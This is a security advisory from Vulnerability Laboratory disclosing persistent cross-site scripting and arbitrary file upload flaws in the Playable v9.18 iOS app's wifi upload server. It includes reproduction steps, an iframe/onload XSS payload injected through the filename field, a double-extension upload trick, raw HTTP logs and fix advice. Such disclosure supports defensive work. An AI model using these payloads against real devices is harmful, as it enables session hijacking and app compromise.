@@ -1,0 +1,423 @@
+# Title: Playable 9.18 iOS - Persistent Cross-Site Scripting
+# Author: Vulnerability Laboratory
+# Date: 2020-04-15
+# Software Link: https://apps.apple.com/de/app/playable-the-full-hd-media-player/id502405034
+# CVE: N/A
+
+Document Title:
+===============
+Playable v9.18 iOS - Multiple Web Vulnerabilities
+
+
+References (Source):
+====================
+https://www.vulnerability-lab.com/get_content.php?id=2198
+
+
+Release Date:
+=============
+2020-04-16
+
+
+Vulnerability Laboratory ID (VL-ID):
+====================================
+2198
+
+
+Common Vulnerability Scoring System:
+====================================
+7.3
+
+
+Vulnerability Class:
+====================
+Multiple
+
+
+Current Estimated Price:
+========================
+1.000€ - 2.000€
+
+
+Product & Service Introduction:
+===============================
+Watch your MKV, MP4 and MOV movie files on your iPad, iPhone or iPod
+Touch without conversion -
+just copy files to your device through iTunes or over Wifi!  To search
+for closed captions /
+subtitles select a video then press the magnifying glass icon to the top
+right of the video.
+
+(Copy of the Homepage:
+https://apps.apple.com/de/app/playable-the-full-hd-media-player/id502405034
+)
+
+
+Abstract Advisory Information:
+==============================
+The vulnerability laboratory core research team discovered multiple
+vulnerabilities in the official Playable v9.18 apple ios mobile application.
+
+
+Affected Product(s):
+====================
+Portable Ltd
+Product: Playable v9.18 - iOS Mobile Web Application
+
+
+Vulnerability Disclosure Timeline:
+==================================
+2020-04-16: Public Disclosure (Vulnerability Laboratory)
+
+
+Discovery Status:
+=================
+Published
+
+
+Exploitation Technique:
+=======================
+Remote
+
+
+Severity Level:
+===============
+High
+
+
+Authentication Type:
+====================
+Pre auth - no privileges
+
+
+User Interaction:
+=================
+Low User Interaction
+
+
+Disclosure Type:
+================
+Independent Security Research
+
+
+Technical Details & Description:
+================================
+1.1
+A persistent script code injection web vulnerability has been discovered
+in the official Playable v9.18 apple ios mobile application.
+The vulnerability allows remote attackers to inject own malicious
+persistent script codes to the application-side for manipulation.
+
+The vulnerability is located in the filename parameter of the upload
+module. Attackers with wifi access are able to perform uploads
+with malicious script code to manipulation the mobile application ui.
+The request method to inject is POST and the attack vector of
+the vulnerability is persistent. Attackers are able to inject html and
+javascript codes to comrpomise the mobile wifi web-application.
+The injection point is the upload form on localhost:8881 and the
+execution occurs on localhost:80 with the visible ui listing.
+
+Successful exploitation of the vulnerability results in session
+hijacking, persistent phishing attacks, persistent external redirects
+to malicious source and persistent manipulation of affected mobile
+application modules.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Function(s):
+[+] upload
+
+Vulnerable Parameter(s):
+[+] filename
+
+
+1.2
+An arbitrary file upload web vulnerability has been discovered in the
+official Playable v9.18 apple ios mobile application.
+The arbitary file upload vulnerability allows remote attackers to upload
+malicious files to compromise the mobile application.
+
+The vulnerability is located in the filename parameter of the upload
+module. Attackers with wifi access are able to perform
+uploads with malicious file extions to bypass the parse function. In a
+second step the attacker requests the local file to
+execute the malicious content on the local web-server. The request
+method to inject is POST and the attack vector of the
+vulnerability is located on the application-side. The injection point is
+the upload form on localhost:8881. The execution
+point becomes visible by a request the localhost:80/vid/[filename] path
+with the uploaded file content. The is present
+because of a missing file parse and insecure upload handling on file
+extensions. As well the local web-server can be
+reconfigured to provide more security on user interactions.
+
+Successful exploitation of the arbitrary file upload vulnerability
+results in a compromise of the local ios mobile application.
+
+Request Method(s):
+[+] POST
+
+Vulnerable Function(s):
+[+] upload
+
+Vulnerable Parameter(s):
+[+] filename
+
+Affected Module(s):
+[+] /vid/
+
+
+Proof of Concept (PoC):
+=======================
+1.1
+The persistent script code injection vulnerability can be exploited by
+remote attackers with wifi network access without user interaction.
+For security demonstration or to reproduce the vulnerability follow the
+provided information and steps below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Install the ios application
+(https://apps.apple.com/us/app/playable-the-full-hd-media-player/id502405034)
+2. Start the ios application on your local ios device
+3. Start the wifi share service in the application ui
+4. Open the web-browser
+5. Tamper the http requests
+6. Prepare to upload any file and press the upload button
+7. Inject as filename any html/js script code payload
+8. Continue to transmit the POST method request
+9. The file executes on the index listing on port 8881
+(http://localhost:8881/index.html)
+10. Successful reproduce of the persistent script code injection web
+vulnerability!
+
+
+PoC: Exploitation
+>"<iframe src=evil.source onload=alert(document.domain)>.jpg
+
+
+--- PoC Session logs [POST] ---
+Status: 200[OK]
+POST http://localhost:8881/upload
+Mime Type[text/html]
+   Request Header:
+      Host[localhost:8881]
+      User-Agent[Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0)
+Gecko/20100101 Firefox/52.0]
+      Accept[*/*]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Referer[http://localhost:8881/index.html]
+      Content-Length[8559]
+      Content-Type[multipart/form-data;
+boundary=---------------------------3823323145734]
+      Connection[keep-alive]
+   POST-Daten:
+      POST_DATA[-----------------------------3823323145734
+Content-Disposition: form-data; name="file"; filename=">"<iframe
+src=evil.source onload=alert(document.domain)>.jpg"
+-
+Status: 200[OK]
+GET http://localhost/evil.source
+Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost/evil.source]
+      User-Agent[Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0)
+Gecko/20100101 Firefox/52.0]
+
+Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Connection[keep-alive]
+      Upgrade-Insecure-Requests[1]
+      Cache-Control[max-age=0]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[8559]
+
+
+
+1.2
+the arbitrary file upload vulnerability can be exploited by local
+attackers with wifi network access without user interaction.
+For security demonstration or to reproduce the vulnerability follow the
+provided information and steps below to continue.
+
+
+Manual steps to reproduce the vulnerability ...
+1. Install the ios application
+(https://apps.apple.com/us/app/playable-the-full-hd-media-player/id502405034)
+2. Start the ios application on your local ios device
+3. Start the wifi share service in the application ui
+4. Open the web-browser
+5. Tamper the http requests
+6. Prepare a js file with malicious test content
+7. Extend the file name with .jpg
+Note: The upload mechanism does not parse or checks for multiple
+extensions on file uploads
+8. Upload the file by pushing the Upload File button
+9. Open the url in the default /vid/ folder and remove the .jpg extension
+10. The simple js executes in the scripting engine when opening
+11. Successful reproduce of the arbitrary file upload vulnerability!
+Note: Using the ftp you can perform to create the file via console
+ftp://localhost (read/write permissions)
+
+
+PoC: Exploitation
+http://localhost/vid/clay.js.jpg
+
+
+--- PoC Session logs [POST] ---
+Status: 200[OK]
+POST http://localhost:8881/upload
+Mime Type[text/html]
+   Request Header:
+      Host[localhost:8881]
+      User-Agent[Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0)
+Gecko/20100101 Firefox/52.0]
+      Accept[*/*]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Referer[http://localhost:8881/index.html]
+      Content-Length[86856]
+      Content-Type[multipart/form-data;
+boundary=---------------------------3823323145733]
+      Connection[keep-alive]
+   POST-Daten:
+      POST_DATA[-----------------------------3823323145733
+Content-Disposition: form-data; name="file"; filename="clay.js.jpg"
+-
+Status: 200[OK]
+GET http://localhost/listVideosJson
+Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost]
+      User-Agent[Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0)
+Gecko/20100101 Firefox/52.0]
+      Accept[application/json, text/javascript, */*; q=0.01]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      X-Requested-With[XMLHttpRequest]
+      Referer[http://localhost/]
+      Connection[keep-alive]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[87]
+-
+Status: 200[OK]
+GET http://localhost/vid/clay.js.jpg
+Mime Type[application/iosjpg]
+   Request Header:
+      Host[localhost]
+      User-Agent[Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0)
+Gecko/20100101 Firefox/52.0]
+
+Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Referer[http://localhost/]
+      Connection[keep-alive]
+      Upgrade-Insecure-Requests[1]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[86670]
+      Content-Type[application/iosjpg;]
+-
+Status: 200[OK]
+GET http://localhost/vid/clay.js
+Mime Type[application/x-unknown-content-type]
+   Request Header:
+      Host[localhost]
+      User-Agent[Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:52.0)
+Gecko/20100101 Firefox/52.0]
+
+Accept[text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8]
+      Accept-Language[de,en-US;q=0.7,en;q=0.3]
+      Accept-Encoding[gzip, deflate]
+      Connection[keep-alive]
+      Upgrade-Insecure-Requests[1]
+   Response Header:
+      Accept-Ranges[bytes]
+      Content-Length[0]
+
+
+Solution - Fix & Patch:
+=======================
+1.1
+The vulnerability can be resolved by a restriction and parse of the
+filename parameter. Disallow special chars and restrict inputs.
+Encode also the output locations to ensure nobody is able to execute
+script code in the main file listing.
+
+1.2
+Parse the filename for multiple extensions and prevent that attackers
+open specific dangerous file extensions that could
+compromise the local application path.
+
+
+Security Risk:
+==============
+1.1
+The security risk of the script code injection web vulnerability in the
+mobile ios application is estimated as high.
+
+1.2
+The security risk of the arbitrary file upload vulnerability in the
+mobile ios application is estimated as high.
+
+
+Credits & Authors:
+==================
+Vulnerability-Lab -
+https://www.vulnerability-lab.com/show.php?user=Vulnerability-Lab
+Benjamin Kunz Mejri -
+https://www.vulnerability-lab.com/show.php?user=Benjamin%20K.M.
+
+
+Disclaimer & Information:
+=========================
+The information provided in this advisory is provided as it is without
+any warranty. Vulnerability Lab disclaims all warranties,
+either expressed or implied, including the warranties of merchantability
+and capability for a particular purpose. Vulnerability-Lab
+or its suppliers are not liable in any case of damage, including direct,
+indirect, incidental, consequential loss of business profits
+or special damages, even if Vulnerability-Lab or its suppliers have been
+advised of the possibility of such damages. Some states do
+not allow the exclusion or limitation of liability for consequential or
+incidental damages so the foregoing limitation may not apply.
+We do not approve or encourage anybody to break any licenses, policies,
+deface websites, hack into databases or trade with stolen data.
+
+Domains:    www.vulnerability-lab.com		www.vuln-lab.com			
+www.vulnerability-db.com
+Services:   magazine.vulnerability-lab.com
+paste.vulnerability-db.com 			infosec.vulnerability-db.com
+Social:	    twitter.com/vuln_lab		facebook.com/VulnerabilityLab 		
+youtube.com/user/vulnerability0lab
+Feeds:	    vulnerability-lab.com/rss/rss.php
+vulnerability-lab.com/rss/rss_upcoming.php
+vulnerability-lab.com/rss/rss_news.php
+Programs:   vulnerability-lab.com/submit.php
+vulnerability-lab.com/register.php
+vulnerability-lab.com/list-of-bug-bounty-programs.php
+
+Any modified copy or reproduction, including partially usages, of this
+file requires authorization from Vulnerability Laboratory.
+Permission to electronically redistribute this alert in its unmodified
+form is granted. All other rights, including the use of other
+media, are reserved by Vulnerability-Lab Research Team or its suppliers.
+All pictures, texts, advisories, source code, videos and other
+information on this website is trademark of vulnerability-lab team & the
+specific authors or managers. To record, list, modify, use or
+edit our material contact (admin@ or research@) to get a ask permission.
+
+				    Copyright © 2020 | Vulnerability Laboratory - [Evolution
+Security GmbH]™
+
+
+
+
+-- 
+VULNERABILITY LABORATORY - RESEARCH TEAM
